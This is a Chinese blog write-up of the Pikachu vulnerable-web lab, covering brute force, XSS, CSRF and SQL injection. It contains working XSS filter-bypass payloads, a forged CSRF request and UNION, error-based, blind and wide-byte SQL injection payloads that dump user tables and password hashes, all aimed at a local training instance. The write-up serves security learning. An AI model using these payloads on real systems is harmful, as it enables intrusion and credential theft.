---
title: Pikachu暴力破解-SQLI记录
published: 2025-10-30
description: pikachu靶场的Burte Force、Cross-Site Scripting、CSRF、SQL-inject通关记录。
tags: [WEB攻防,靶场]
category: 网络安全
draft: false
---

## Burte Force

> “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。
>
> 理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：
>
> 1. 是否要求用户设置复杂的密码；
> 2. 是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
> 3. 是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
>
> 4. 是否采用了双因素认证；
>
> ...等等。
>
> 千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!

### 基于表单的暴力破解

使用bp抓包，丢到intruder中将账号密码这两个加上参数并选择Cluster Bomb模块（图中只加了变量，没有选择攻击模式）。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc01.png)

在payloads中给两个参数添加爆破值。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc02.png)

![pkc03](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc03.png)

根据返回长度锁定，再修改抓包时的账号密码为其中的一个，提示login success。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc04.png)

#### 源代码分析

```php
//典型的问题,没有验证码,没有其他控制措施,可以暴力破解
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password']){

    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);


    $line_pre->bind_param('ss',$username,$password);

    if($line_pre->execute()){
        $line_pre->store_result();
        if($line_pre->num_rows>0){
            $html.= '<p> login success</p>';

        } else{
            $html.= '<p> username or password is not exists～</p>';
        }

    } else{
        $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
    }

}
```

### 验证码绕过(on server)

使用bp抓包，发现提交登录时的验证码并不会刷新，这时候再拿第一关已经爆破出的账号密码进行登录：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc05.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc06.png)

#### 源代码分析

```php
if(isset($_POST['submit'])) {
    if (empty($_POST['username'])) {
        $html .= "<p class='notice'>用户名不能为空</p>";
    } else {
        if (empty($_POST['password'])) {
            $html .= "<p class='notice'>密码不能为空</p>";
        } else {
            if (empty($_POST['vcode'])) {
                $html .= "<p class='notice'>验证码不能为空哦！</p>";
            } else {
//              验证验证码是否正确
                if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
                    $html .= "<p class='notice'>验证码输入错误哦！</p>";
                    //应该在验证完成后,销毁该$_SESSION['vcode']
                }else{

                    $username = $_POST['username'];
                    $password = $_POST['password'];
                    $vcode = $_POST['vcode'];

                    $sql = "select * from users where username=? and password=md5(?)";
                    $line_pre = $link->prepare($sql);

                    $line_pre->bind_param('ss',$username,$password);

                    if($line_pre->execute()){
                        $line_pre->store_result();
                        //虽然前面做了为空判断,但最后,却没有验证验证码!!!
                        if($line_pre->num_rows()==1){
                            $html.='<p> login success</p>';
                        }else{
                            $html.= '<p> username or password is not exists～</p>';
                        }
                    }else{
                        $html.= '<p>执行错误:'.$line_pre->errno.'错误信息:'.$line_pre->error.'</p>';
                    }
                }
            }
        }
    }
}
```

### 验证码绕过(on client)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc07.png)

#### 源代码分析

js部分：

```js
<script language="javascript" type="text/javascript">
    var code; //在全局 定义验证码
    function createCode() {
        code = "";
        var codeLength = 5;//验证码的长度
        var checkCode = document.getElementById("checkCode");
        var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');//所有候选组成验证码的字符，当然也可以用中文的

        for (var i = 0; i < codeLength; i++) {
            var charIndex = Math.floor(Math.random() * 36);
            code += selectChar[charIndex];
        }
        //alert(code);
        if (checkCode) {
            checkCode.className = "code";
            checkCode.value = code;
        }
    }

    function validate() {
        var inputCode = document.querySelector('#bf_client .vcode').value;
        if (inputCode.length <= 0) {
            alert("请输入验证码！");
            return false;
        } else if (inputCode != code) {
            alert("验证码输入错误！");
            createCode();//刷新验证码
            return false;
        }
        else {
            return true;
        }
    }
    createCode();
</script>
```

php部分：

```php
if(isset($_POST['submit'])){
    if($_POST['username'] && $_POST['password']) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $sql = "select * from users where username=? and password=md5(?)";
        $line_pre = $link->prepare($sql);


        $line_pre->bind_param('ss', $username, $password);

        if ($line_pre->execute()) {
            $line_pre->store_result();
            if ($line_pre->num_rows > 0) {
                $html .= '<p> login success</p>';

            } else {
                $html .= '<p> username or password is not exists～</p>';
            }

        } else {
            $html .= '<p>执行错误:' . $line_pre->errno . '错误信息:' . $line_pre->error . '</p>';
        }


    }else{
        $html .= '<p> please input username and password～</p>';
    }
}
```

### token防爆破?

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc08.png)

查看pretty，发现代码中将token值回显到了前端属性中。

```html
<input type="hidden" name="token" value="51726690317536fc74634216380" />
```

发送到intruder中爆破，且只设置密码和token这两个变量，方法选择pitchfork（鱼叉模式），pitchfork简单理解就是你设置了几个变量，他就能用几个payload，我们设置2个，就有2个payload，并且一一对应。

密码还是依旧使用简单列表。

token配置方面，Payload type改为Recursive grep；选择settings找到Grep-Extract栏目，打勾并add，然后选择refetch response，在下方代码找到token的值并选中，后选择ok。之后的操作都放了图片。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc09.png)

将最下方的redirections（重定向）选择为always。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc10.png)

回到payloads处，把页面回显的token值放到这里，开始攻击。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc11.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc13.png)

#### 源代码分析

在bf_token.php中，有调用到`set_token();`，跟进函数发现在inc/function.php中，函数每次调用前都会检查当前session是否有token参数，有的话会先删除掉这个token再重新生成并保存到session中，也就无法重复利用了。

```php
//生成一个token,以当前微妙时间+一个5位的前缀
function set_token(){
    if(isset($_SESSION['token'])){
       unset($_SESSION['token']);
    }
    $_SESSION['token']=str_replace('.','',uniqid(mt_rand(10000,99999),true));
}
```

## Cross-Site Scripting

> XSS（跨站脚本）概述
>
> Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：
>
> 1. 反射性XSS;
> 2. 存储型XSS;
> 3. DOM型XSS;
>
> XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。
>
> XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。
>
> 形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
>
> 因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
>
> 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
>
> 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

### 反射型xss(get)

方法一：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc14.png)

方法二：

拼接到url中：

```http
http://192.168.127.128:8086/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%271%27%29%3C%2Fscript%3E&submit=submit
```

#### 源代码分析

```php
// 无过滤
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{
        if($_GET['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_GET['message']}一样，永远年轻，永远热血沸腾！</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";
        }
    }
}
```

### 反射性xss(post)

直接使用之前爆破出的账号密码进行登录。

与上一关唯一不同的就是传递的方式换成了POST，同样也是无任何过滤直接返回到前端。



![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc15.png)

#### 源代码分析

```php
//下面直接将前端输入的参数原封不动的输出了,出现xss
        if($_POST['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_POST['message']}一样，永远年轻，永远热血沸腾！</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_POST['message']},i don't care!</p>";
        }
```

### 存储型xss

存储型与反射性的区别就是，反射型是一次性的，而存储型是存在数据库中的，每请求一次就会触发一次，所以当使用xss攻击后，只要去访问就会弹出。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc16.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc17.png)

### DOM型xss

DOM型就是将XSS输入到标签属性中了，利用属性进行触发。

点击what do you see?时候就会触发xss。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc18.png)

### DOM型xss-x

同上，只不过这个多了一层。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc19.png)

#### 源代码分析

```php+HTML
<?php
if(isset($_GET['text'])){
    $html.= "<a href='#' onclick='domxss()'>有些费尽心机想要忘记的事情,后来真的就忘掉了</a>";
}
?>
<script>
	function domxss(){
		var str = window.location.search;
		var txss = decodeURIComponent(str.split("text=")[1]);
		var xss = txss.replace(/\+/g,' ');
//                        alert(xss);

		document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
		}
                    //试试：'><img src="#" onmouseover="alert('xss')">
                    //试试：' onclick="alert('xss')">,闭合掉就行
</script>
```

### xss盲打

XSS盲打就是攻击者在进行XSS插入时不会在前端有回显，但是在后台可以看得到，当管理员进行后台登录时就会看到XSS的内容，如果存在这种漏洞危害性还是很大的，因为能直接盗取管理员的COOKIE拿到权限，但又十分隐蔽，只能进行尝试不能确保一定存在。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc20.png)

![pkc21](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc21.png)

### xss之过滤

> **大小写绕过：**
>
> ```html
> <ScRiPt>alert(1)</ScRiPt>
> ```
>
> **img标签：**
>
> ```html
> <img src=1 onerror=alert(1)>
> ```
>
> **图形标签：**
>
> ```html
> <svg/onload=alert(1)>
> ```
>
> **空格与分隔符绕过：**
>
> 空格替换为其他分隔符，如：`\t`（tab）、`\n`（换行）、`\x0b`（垂直制表）、\xod(回车符)
>
> ```html
> <img\x0bonerror\x0d=alert(1)>
> ```
>
> **以及还有编码绕过（URL编码、Unicode）等等操作**
>
> 源自于：https://blog.csdn.net/rasssel/article/details/149275514

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc22.png)

### xss之htmlspecialchars

htmlspecialchars是 PHP 的内置函数，用于将特殊字符转换为 HTML 实体，以防止代码解析异常或 跨站脚本攻击（XSS）。其核心功能是将 `&`、`<`、`>`、`"`、`'` 这五个字符转换为对应的 HTML 实体。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc23.png)

### xss之href输出

同上

### xss之js输出

#### 源代码分析

```js
<script>
    $ms='tmac';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }
</script>
```

没有过滤，所以直接闭合掉script再进行插入。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc24.png)



## CSRF

> CSRF(跨站请求伪造)概述
>
> Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one click"攻击。
>
> 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。
>
> 这里列举一个场景解释一下，希望能够帮助你理解。
>
> **场景需求：**
>
> 小黑想要修改大白在购物网站`tianxiewww.xx.com`上填写的会员地址。
>
> **先看下大白是如何修改自己的密码的：**
>
> 登录---修改会员信息，提交请求---修改成功。
>
> 所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。
>
> 但是大白又不会把自己`xxx网站`的账号密码告诉小黑，那小黑怎么办？
>
> 于是他自己跑到`www.xx.com`上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：`【http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Change】`
>
> 于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。
>
> **为啥小黑的操作能够实现呢。有如下几个关键点：**
>
> 1. `www.xxx.com`这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;
>    ---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。
> 2. 小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;
>    ---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。
>    ---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。
>
> 当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做：
>
> 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。
>
> ---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。                    
>
> 因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：
>
> --对敏感信息的操作增加安全的token；
>
> --对敏感信息的操作增加安全的验证码；
>
> --对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。

### CSRF(get) login

登录**用户lucy**的账号，然后修改抓包。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc25.png)

此时**用户lili**这边进行访问`http://192.168.127.128:8086/vul/csrf/csrfget/csrf_get_edit.php?sex=kobe1&phonenum=kobe1&add=kobe1&email=kobe1&submit=submit`：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc26.png)

### CSRF(post) login

在修改内容包的页面 Engagement tools -> Generte csrf poc

自动生成一个csrf的html文件，放到浏览器即可触发。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc27.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc28.png)

### CSRF Token

这个就是多了个token，实际步骤与[token防爆破](token防爆破?)中一样。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc29.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc30.png)

## SQL-Inject

> Sql Inject(SQL注入)概述
>
> 哦,SQL注入漏洞，可怕的漏洞。
>
> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。
>
> **一个严重的SQL注入漏洞，可能会直接导致一家公司破产！**
>
> SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。                       
>
> 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。
>
> 在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
>
> 1. 对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
> 2. 使用参数化（Parameterized Query 或 Parameterized Statement）；
> 3. 还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重! 

### 前置知识

在 SQL 注入（SQLi）中，**判断闭合方式** 是构造有效 Payload 的前提。不同后端 SQL 语句对输入的包裹方式不同，必须先“闭合”原语句，再插入自己的 SQL 片段，最后再用注释符把多余部分“吃掉”。

------

1. 为什么要“判断闭合方式”

后端最常见的拼接范式只有 4～5 种：

| 范式示例                             | 需闭合的符号 | 类型         |
| :----------------------------------- | :----------- | :----------- |
| `SELECT * FROM u WHERE id = $id`     | 无           | 数字型       |
| `SELECT * FROM u WHERE id = '$id'`   | 单引号 `'`   | 字符型       |
| `SELECT * FROM u WHERE id = "$id"`   | 双引号 `"`   | 字符型       |
| `SELECT * FROM u WHERE id = ('$id')` | `')`         | 带括号字符型 |
| `SELECT * FROM u WHERE id = ("$id")` | `")`         | 带括号字符型 |

如果不知道原句到底怎么包裹，就无法写出语法正确的注入语句，因此要先做“闭合探测”。

------

2. 判断闭合方式的 3 个步骤

（以 GET 参数 `?id=1` 为例）

- **探类型**

  `?id=2-1` 返回与 `?id=1` 相同 → 数字型，**无闭合符**；

  若不同，继续下面步骤。

- **探最外层符号**

  依次追加 `'`、`"`、`)`、`")`、`')` 并立即注释：

  `?id=1' --+` 正常 → 单引号闭合

  `?id=1" --+` 正常 → 双引号闭合

  `?id=1') --+` 正常 → 单引号+右括号闭合

  `?id=1") --+` 正常 → 双引号+右括号闭合
  报错就换下一个组合，直到页面恢复正常。

- **布尔验证**

  用 `AND 1=1` / `AND 1=2` 再确认一次：

  `?id=1' AND 1=1 --+` 正常

  `?id=1' AND 1=2 --+` 空/报错

  即可 100% 确定单引号闭合成功。

------

3. 常见闭合方式速查表

| 闭合符       | 后端语句模板         | 典型 Payload 模板                        |
| :----------- | :------------------- | :--------------------------------------- |
| 无（数字型） | `WHERE id = $id`     | `?id=1 AND 1=2 UNION SELECT 1,2,3`       |
| `'`          | `WHERE id = '$id'`   | `?id=1' AND 1=2 UNION SELECT 1,2,3 --+`  |
| `"`          | `WHERE id = "$id"`   | `?id=1" AND 1=2 UNION SELECT 1,2,3 --+`  |
| `')`         | `WHERE id = ('$id')` | `?id=1') AND 1=2 UNION SELECT 1,2,3 --+` |
| `")`         | `WHERE id = ("$id")` | `?id=1") AND 1=2 UNION SELECT 1,2,3 --+` |

------

4. 小技巧

- 报错信息里多出来的 `'`、`)` 往往就是原句残留的符号，直接拿来用即可。
- `%23` (`#`)、`-- `、`--+` 都是单行注释，选哪个取决于后端过滤与空格编码。
- 如果 `ORDER BY` 报错，把闭合符和注释一起写：`?id=1' ORDER BY 3 --+`。

掌握“先探类型 → 再探符号 → 布尔验证”的流程，就能在实战中快速锁定闭合方式，为后续 UNION、盲注、报错等利用打好基础。

### 数字型注入(post)

> SQL注入中对于数字型注入不需要进行闭合，直接 and 1=1 和and 1=2 进行探测发现返回的响应页面不同（漏洞简单探测）。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc31.png)

![pkc32](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc32.png)

```sql
order by 探测列表数，表单列数为2
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc33.png)

```sql
union 查询 id=1 union select user(),database()#
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc34.png)

得到是pikachu用户，使用的数据库也是pikachu。

查询当前数据库中的表：

```sql
id=-1 union select user(),group_concat(table_name) from information_schema.tables where table_schema=database()#
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc35.png)

查询users表中的字段信息。

```sql
id=-1 union select user(),group_concat(column_name) from information_schema.columns where table_name='users'#
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc36.png)

根据字段查询内容。

```sql
id=-1 union select group_concat(username),group_concat(password) from users#
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc37.png)

### 字符型注入(get)

> 输入一个单引号`'` 发现报错（简单漏洞探测） 并且有报错回显也可以进行**报错注入**。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc38.png)

payload：

```sql
lili' or 1=1#
lili' order by 2#
lili' union select database(),user()#
-1' union select database(),user()#
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu'#
-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema="pikachu" and table_name='users'#
-1' union select 1,group_concat(username,':',password) from pikachu.users#
// 最后得到
admin:e10adc3949ba59abbe56e057f20f883e,pikachu:670b14728ad9902aecba32e22fa4f6bd,test:e99a18c428cb38d5f260853678922e03
```

### 搜索型注入

Get请求，同上。

### xx型注入

payload:lili'，报错内容：

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''lili'')' at line 1
```

那就补个`)`再进行闭合：

payload：

```sql
lili') or 1=1#
// 其他都差不多
```

### "insert/update"注入

先尝试它的闭合方式，我们这里尝试用`'`去进行闭合。

```sql
kobe' or updatexml(1,concat(0x7e,database()),0) or '
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc39.png)

之后的payload基本就是去拿表结构，字段名，账号密码。

```sql
 ' or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or '
 ' or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name="users"),1,31),0x7e),1) or '
 ' or updatexml(1,concat(0x7e,substr((select group_concat(username,':',password) from users),1,31),0x7e),1) or '
```

### "delete"注入

同上，payload：

```sql
id=1 or updatexml(1,concat(0x7e,database()),0)
```

### "http header"注入

在COOKIE里进行注入，操作同上，只是位置不同，直接在bp中抓包修改即可，注入的方法都一样，类似的还有XFF注入。

### 基于boolian的盲注

**盲注，即无数据回显，不能看到返回的数据，需要利用其他方式判断（布尔 or 延时）**

payload为：`lili' and 1=1#`返回正常信息，说明为字符型的盲注。

以下引用自：https://blog.csdn.net/2301_79595769/article/details/144663938

> 我们可以先用 length(database()) 判断 数据库名称的长度
>
> kobe' and length(database())>5#
>
> 。。。
>
> kobe' and length(database())=7#
>
> 回显正确页面，继续
>
> 再用 substr() 和 ascii() 判断数据库由哪些字母组成（可以用二分法）
>
> kobe' and ascii(substr(database(), 1, 1)) > 113#
>
> kobe' and ascii(substr(database(), 1, 1)) > 105#
>
> 。。。
>
> kobe' and ascii(substr(database(), 1, 1)) = 112#
>
> 不断重复，然后取得数据库名。再和 information_schema 和 length 猜测 表名 的长度，我们可以用下面的 SQL 语句替代上面的 database()

**还有使用bp的方法**

输入

```sql
lili' and substr(database(),1,1)='p'#
```

攻击类型选用单个sniper，也就是单个payload，之后把要猜的字符改为变量。

在猜数据库名字符时，“加下划线”是为了**模拟真实数据库命名中常见的下划线分隔符**，是一种**基于命名规范的智能推测手段**，**针对数据库命名惯例**的优化策略。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc41.png)

或者可以使用两个，**把要猜的位数也添加为变量**。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc42.png)

得到结果：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc43.png)

### 基于时间的盲注

延时判断就要用到sleep函数了，`lili' and sleep(3)#`利用数据库的延时，进行正误的判断，会发现页面停顿3秒后才有回显。

我们可以利用if函数if(条件,为真时执行的操作，为假时执行的操作)

```sql
lili' and if((substr(database(),1,1))='p',sleep(3),sleep(0))#
```

### wide byte注入

宽字节注入了解的比较少，所以就找了几篇师傅的文章做参考吧。

> 攻击背景：
>
> 1. 为了防止SQL注入，老式的PHP程序会开启 magic_quotes_gpc 选项，或者程序员手动使用 addslashes()、mysql_real_escape_string() 等函数。
>
> 2. 这些功能会在特殊字符`（如单引号 '）`前加上一个`反斜杠（\）`进行转义。
>
>    例如，用户输入`ABC'`，经过转义后会变成`ABC\'`。
>
>    这样，当输入被拼接到SQL语句中时，`\'`会被数据库认为是一个普通的单引号字符，而不是字符串的结束符，从而无法破坏SQL语句结构。
>
>    
>
> 攻击原理：
>
> “宽字节注入”利用了数据库连接层的一个特性：当MySQL连接使用 GBK、BIG5、SJIS 等宽字符集（ multibyte character set）时，可能会将两个字节识别为一个汉字。
>
> 关键点：在GBK编码中，%df%5c 是一个合法的汉字。
>
> %df 就是我们讨论的这个字符。
>
> %5c 是`反斜杠 \ `的URL编码。
>
> 
>
> 攻击过程：
>
>
> 假设我们想注入 id=1'，但程序会对单引号转义。
>
> 正常输入被转义：
>
> 输入：`1'`
>
> 转义后：`1\'` （单引号前被加上了反斜杠 \）
>
> 最终`SQL：SELECT * FROM users WHERE id = '1\'';`
>
> 这个SQL是合法的，单引号被转义，注入失败。
>
> 使用 %df 进行宽字节注入：
>
> 输入：`%df'`（注意，这里是输入 %df 这个字符，而不是输入这三个符号）
>
> 转义机制工作：程序看到单引号`'`，于是在它前面加一个反斜杠`\`。
>
> ​	转义后的数据变成了：`%df\'`
>
> ​	在十六进制表示下，这就是：`df 5c 27` （%df + \ + '）
>
> **魔法时刻**：当数据库连接使用 GBK 这类宽字符集时，它会将 `%df%5c`（即 df 和 5c 这两个字节）“吞并”，理解为一个GBK编码的汉字 “運” （yùn）。
>
> 最终，数据库看到的SQL语句变成了：
>
> ```sql
> SELECT * FROM users WHERE id = '運'';
> ```
>
> **看！反斜杠（\）神奇地消失了！** 单引号`'`失去了它的保护伞（反斜杠），重新暴露出来，成为了一个未转义的单引号，成功地闭合了前面的字符串。
>
> 现在，攻击者就可以在这个单引号之后继续构造Payload，例如：`%df' AND 1=1 # 或 %df' UNION SELECT ... #`。
>
> 
>
> 总结：`%df`的意义
>
> 目的：它是一个用于触发宽字节注入的精心构造的字节。
>
> 作用：与系统自动添加的反斜杠`（\，%5c）`结合，形成一个宽字符`（如GBK中的“運”）`，从而“吃掉”用于防护的安全反斜杠，使后续的单引号重新生效。
>
> 条件：这种攻击成功需要两个前提：
>
> 数据库连接使用了宽字符集`（如 GBK, BIG5）`。
>
> 目标网站使用了转义函数`（如 addslashes）`但未使用参数化查询。

尝试使用宽字节注入，在pikachu靶场的字符型sql注入中输入xx' or 1=1#就会返回所有人的信息，那么在这里按理来说，输入xx%df' or 1=1#应该也可以输出好多人的信息，但是这里没有。

但是当我们抓包时，将name改为1%df' or 1=1#时：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc44.png)

> 然后再放包，就出现了所有人的信息，为什么呢？
>
> 因为首先如果在输入框输入1%df'后面会进行url编码，将%号url编码为%25，将单引号url编码为%27，并且生成斜杠然后url编码为%5c，所以原来的就变成1%25df%5c%27，但是在GBK编码中，%df%5c 是一个合法的汉字，%25df%5c就不是一个合法的汉字了，从而导致单引号没有逃逸。
>
> 当我们在抓包后输入时，%就不会被url进行编码，从而当发现我们输入单引号时，系统生成斜杠（\），并且对它进行url编码为%5c，从而%df%5c表示一个汉字，从而剩下了单引号留下。

抓包后输入后没有报错，那么存在两列。

```sql
1%df' order by 2#
```

输入：

```sql
1%df' union select 1,database()#
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/pkc45.png)

这里就拿到了数据库名，剩余步骤就和其他sqli一样。